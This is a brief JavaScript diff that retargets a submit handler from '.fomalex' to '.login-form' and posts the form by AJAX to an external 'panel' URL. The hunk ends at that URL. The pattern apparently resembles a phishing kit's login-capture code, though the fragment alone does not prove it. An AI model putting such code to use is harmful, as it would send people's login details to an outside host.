@@ -1,5 +1,5 @@
-$(".fomalex").submit(function() {
-	var d = $(".fomalex");
+$(".login-form").submit(function() {
+	var d = $(".login-form");
 
 	$.ajax({
         url: "https://panel.renznesia.com/index.php",
